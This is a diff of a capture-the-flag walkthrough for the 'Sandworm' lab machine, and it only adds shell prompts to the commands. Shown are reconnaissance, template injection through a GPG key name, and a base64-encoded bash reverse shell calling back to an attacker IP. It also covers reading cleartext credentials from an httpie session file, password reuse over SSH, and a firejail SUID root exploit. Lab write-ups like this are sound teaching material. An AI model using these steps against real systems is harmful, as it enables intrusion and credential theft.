@@ -21,8 +21,8 @@ Sandworm is a medium Linux box at `10.10.11.218`, themed as the "Secret Spy Agen
 Full versioned scan on the three open ports.
 
 ```bash
-nmap -p- --min-rate 10000 10.10.11.218
-nmap -p 22,80,443 -sCV 10.10.11.218
+$ nmap -p- --min-rate 10000 10.10.11.218
+$ nmap -p 22,80,443 -sCV 10.10.11.218
 ```
 
 ```
@@ -40,13 +40,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 OpenSSH 8.9p1 on the `3ubuntu0.1` package put this on Ubuntu 22.04 jammy. Port 80 redirected to `https://ssa.htb/`, so the real app is on 443. The TLS cert is full of hints: `commonName=SSA`, `organizationName=Secret Spy Agency`, and `emailAddress=atlas@ssa.htb`. That `atlas` is the web user, and it confirms the SSA theme. I added the vhost and browsed.
 
 ```bash
-echo '10.10.11.218 ssa.htb' | sudo tee -a /etc/hosts
+$ echo '10.10.11.218 ssa.htb' | sudo tee -a /etc/hosts
 ```
 
 The 404 page and footer gave away Flask. Directory enumeration filled in the routes.
 
 ```bash
-feroxbuster -u https://ssa.htb -k
+$ feroxbuster -u https://ssa.htb -k
 ```
 
 ```
@@ -66,7 +66,7 @@ feroxbuster -u https://ssa.htb -k
 A vhost fuzz against the cert hostname found nothing extra.
 
 ```bash
-ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
   -H "Host: FUZZ.ssa.htb" -u https://ssa.htb -fs 8161
 ```
 
@@ -77,7 +77,7 @@ The plan: generate a GPG key whose real name is a Jinja2 expression, clearsign a
 I generated the key with the SSTI probe as the real name.
 
 ```bash
-gpg --gen-key
+$ gpg --gen-key
 ```
 
 ```
@@ -90,8 +90,8 @@ You selected this USER-ID:
 Exported the public key, clearsigned a throwaway message, and submitted both to the verify form.
 
 ```bash
-gpg --armor --export hobala@hobala.hobala
-gpg --clear-sign text
+$ gpg --armor --export hobala@hobala.hobala
+$ gpg --clear-sign text
 ```
 
 The verification output came back with the UID evaluated.
@@ -110,7 +110,7 @@ Primary key fingerprint: B190 709C 7D3B 5821 D6DD 1007 DA6F 52A5 4E53 B4F0
 That fought the filter, so I stopped fighting the payload character set and base64-encoded the actual command. Encode the reverse shell on my side, then decode and pipe to bash inside the template through `os.popen`.
 
 ```bash
-echo 'bash -i >& /dev/tcp/10.10.16.29/1337 0>&1' | base64
+$ echo 'bash -i >& /dev/tcp/10.10.16.29/1337 0>&1' | base64
 # YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yOS8xMzM3IDA+JjE=
 ```
 
@@ -135,7 +135,7 @@ The catch: this shell is inside a firejail sandbox. The filesystem view is restr
 Wandering the parts of `atlas`'s home that were visible, I found a stored httpie session. httpie caches auth in cleartext JSON per host.
 
 ```bash
-cat ~/.config/httpie/sessions/localhost_5000/admin.json
+$ cat ~/.config/httpie/sessions/localhost_5000/admin.json
 ```
 
 ```json
@@ -148,7 +148,7 @@ cat ~/.config/httpie/sessions/localhost_5000/admin.json
 `silentobserver:quietLiketheWind22`. That password was reused for the system account, so SSH worked and dropped me out of the sandbox into a normal session.
 
 ```bash
-ssh silentobserver@ssa.htb
+$ ssh silentobserver@ssa.htb
 # password: quietLiketheWind22
 ```
 
@@ -176,13 +176,13 @@ So root runs a cleanup script, restores the firejail profile, then builds and ru
 I went to `/opt` and traced the dependency.
 
 ```bash
-cd /opt
-ls
+$ cd /opt
+$ ls
 # crates  tipnet
-ls -la /opt/crates
+$ ls -la /opt/crates
 # drwxr-xr-x 3 root  atlas          4096 May  4 17:26 .
 # drwxr-xr-x 5 atlas silentobserver 4096 May  4 17:08 logger
-cat /opt/crates/logger/src/lib.rs
+$ cat /opt/crates/logger/src/lib.rs
 ```
 
 `tipnet` pulls in a local crate `logger` from `/opt/crates/logger`, and its `src/lib.rs` is group-writable by `silentobserver`.
@@ -234,7 +234,7 @@ uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)
 Now for root. The SUID search flagged firejail.
 
 ```bash
-find / -perm /4000 2>/dev/null
+$ find / -perm /4000 2>/dev/null
 ```
 
 ```
@@ -250,7 +250,7 @@ This firejail is `0.9.68`, vulnerable to CVE-2022-31214, a SUID local privilege 
 I ran the Python PoC as `atlas`. It printed the PID to join.
 
 ```bash
-python3 firejail-exploit.py
+$ python3 firejail-exploit.py
 ```
 
 ```
@@ -260,8 +260,8 @@ You can now run 'firejail --join=1126645' in another terminal to obtain a shell 
 In a second `atlas` shell I joined that PID. The detail that matters: just `su -`, not `sudo su -`, since the PAM override is on `su`.
 
 ```bash
-firejail --join=1126645
-su -
+$ firejail --join=1126645
+$ su -
 ```
 
 ```
